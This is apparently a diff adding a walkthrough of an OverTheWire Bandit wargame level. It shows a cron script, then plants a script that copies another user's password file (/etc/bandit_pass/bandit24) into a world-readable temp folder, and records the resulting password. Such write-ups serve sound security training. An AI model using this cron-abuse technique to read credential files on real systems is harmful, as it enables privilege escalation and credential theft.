@@ -1,0 +1,47 @@
+ls /etc/cron.d
+behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
+clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
+
+cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+myname=$(whoami)
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+NOTE: 
+what this script does that it loops through the dir (/var/spool/bandit24/foo),
+it obtains the owner of a file using stat
+(--format "%U", tells stat to print the user (owner) of the file
+./$i, refers to the file in the current directory)
+if the owner of the file is bandit 23, 
+it will execute the file with a timeout of 60 seconds
+
+mkdir /tmp/rand
+touch password
+
+SCRIPT:
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+
+chmod -R 777 /tmp/rand
+-R stands for recursive
+
+cat /tmp/rand/password
+
+password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
